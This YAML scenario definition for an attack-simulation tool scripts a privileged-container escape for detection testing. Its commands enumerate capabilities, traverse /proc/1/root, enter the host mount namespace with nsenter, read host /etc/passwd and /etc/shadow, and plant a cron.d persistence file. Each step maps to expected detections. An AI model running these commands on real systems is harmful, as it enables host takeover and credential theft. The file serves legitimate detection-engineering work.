scenario_id: SIM-CDR-003
name: "Container Escape via Privileged Mode"
version: "1.0"
status: active

plane: CDR
detection_types:
  - BIOC
  - Analytics

uc_ref: UCS-CDR-03
tc_ref: TC-CDR-03
uc_name: "Container Escape Attempt Detection"
tc_name: "Privileged Container Escape via nsenter"

mitre_tactic: "TA0004"
mitre_tactic_name: "Privilege Escalation"
mitre_technique: "T1611"
mitre_technique_name: "Escape to Host"
additional_techniques:
  - technique: "T1610"
    name: "Deploy Container"

threat_report: "Unit42 - Threat Assessment: Kubernetes Attacks in the Wild"
threat_report_url: "https://unit42.paloaltonetworks.com/threat-assessment-kubernetes-attacks/"

execution_identity:
  default: container-runtime
  options:
    - container-runtime
    - root

push_supported: true
pull_supported: true

external_tools:
  - name: deepce
    source: "https://github.com/stealthcopter/deepce"
    type: script
    install_inline: true
  - name: nsenter
    source: "system"
    type: binary
    install_inline: false

steps:
  - id: step-01
    name: "Verify privileged container mode and enumerate escape preconditions"
    command: |
      echo '[*] Checking container privileges...' && \
      cat /proc/self/status | grep -E 'CapEff|CapPrm|CapBnd' && \
      echo '---' && \
      ls /dev/sda 2>/dev/null && echo '[!] Block device /dev/sda accessible — privileged mode confirmed' || echo '[-] /dev/sda not accessible'; \
      cat /proc/1/cgroup | head -5 && \
      echo '[*] Privilege check complete'
    identity: root
    mitre_technique: "T1613"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Container privilege enumeration — /proc/self/status capability read combined with /dev device access"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-container-capability-read-with-block-device-access
      - plane: CDR
        type: Analytics
        description: "Privileged container anomaly — process capability set indicates full host capabilities"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-privileged-container-full-capability-set-anomaly

  - id: step-02
    name: "Enumerate host filesystem via /proc/1 namespace links"
    command: |
      echo '[*] Enumerating host filesystem via PID 1 namespace...' && \
      ls -la /proc/1/root/ 2>/dev/null | head -20 && \
      echo '---' && \
      ls /proc/1/root/etc/ 2>/dev/null | head -20 && \
      cat /proc/1/root/etc/os-release 2>/dev/null && \
      echo '[*] Host filesystem enumeration complete'
    identity: root
    mitre_technique: "T1083"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Host filesystem access via /proc/1/root from container — namespace traversal attempt"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-host-filesystem-access-via-proc1-root-from-container
      - plane: CDR
        type: Analytics
        description: "Suspicious /proc/1/root traversal in container context — host namespace enumeration"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-proc1-root-traversal-host-namespace-enumeration

  - id: step-03
    name: "Use nsenter to break into host mount namespace"
    command: |
      which nsenter && echo '[*] nsenter available — attempting host namespace entry' || (apt-get install -y util-linux -qq 2>/dev/null || apk add --no-cache util-linux 2>/dev/null); \
      nsenter --mount=/proc/1/ns/mnt -- ls /etc/ 2>&1 | head -20 && \
      echo '[*] Successfully entered host mount namespace' || echo '[!] nsenter attempt failed — container may not be privileged'
    identity: root
    mitre_technique: "T1611"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "nsenter execution targeting PID 1 mount namespace — container escape via privileged mode (high fidelity)"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-nsenter-into-pid1-mount-namespace-container-escape
      - plane: CDR
        type: Analytics
        description: "Host namespace access via nsenter — anomalous namespace switch from container process"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-anomalous-namespace-switch-from-container-process

  - id: step-04
    name: "Access host /etc/passwd via escaped namespace"
    command: |
      nsenter --mount=/proc/1/ns/mnt -- cat /etc/passwd 2>/dev/null | head -10 && \
      echo '---' && \
      nsenter --mount=/proc/1/ns/mnt -- cat /etc/shadow 2>/dev/null | head -5 || echo '[-] Shadow file not readable (expected)'; \
      echo '[*] Host credential file access attempt complete'
    identity: root
    mitre_technique: "T1003.008"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Host /etc/passwd access from container via namespace escape — credential harvesting post-escape"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-host-passwd-read-from-container-via-namespace-escape
      - plane: CDR
        type: Analytics
        description: "Sensitive host file read following successful container escape — multi-stage attack chain detected"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-sensitive-host-file-read-following-container-escape

  - id: step-05
    name: "Drop persistence in host /etc/cron.d via escaped namespace"
    command: |
      CRONJOB="* * * * * root echo 'CORTEXSIM-PERSISTENCE-SIM-CDR-003' >> /tmp/cortexsim_escape_proof.txt" && \
      nsenter --mount=/proc/1/ns/mnt -- bash -c "echo '$CRONJOB' > /etc/cron.d/cortexsim-sim 2>/dev/null" && \
      echo '[!] Persistence dropped on HOST at /etc/cron.d/cortexsim-sim' || \
      echo '[-] Could not write to host /etc/cron.d — may require additional privileges'; \
      echo '[CortexSim] Escape persistence step complete'
    identity: root
    mitre_technique: "T1053.003"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Cron persistence written to host filesystem from container escape — T1611 + T1053 chained"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-host-cron-persistence-written-from-escaped-container
      - plane: CDR
        type: Analytics
        description: "Host cron.d file creation following container namespace escape — kill chain stitching signal"
        ttp_ref: TTP-2026-0024
        detection_id: bioc-cdr-003-host-crond-file-creation-after-namespace-escape

cleanup:
  commands:
    - "nsenter --mount=/proc/1/ns/mnt -- rm -f /etc/cron.d/cortexsim-sim /tmp/cortexsim_escape_proof.txt 2>/dev/null || true"
    - "rm -f /tmp/deepce.sh"
    - "echo '[CortexSim] SIM-CDR-003 cleanup complete'"
  k8s_teardown: "kubectl delete -f {manifest_path}"

author: "Henry Reed"
created: "2026-04-12"
last_updated: "2026-04-12"
tags:
  - container-escape
  - privileged-container
  - nsenter
  - namespace-escape
  - privilege-escalation
  - cloud-native
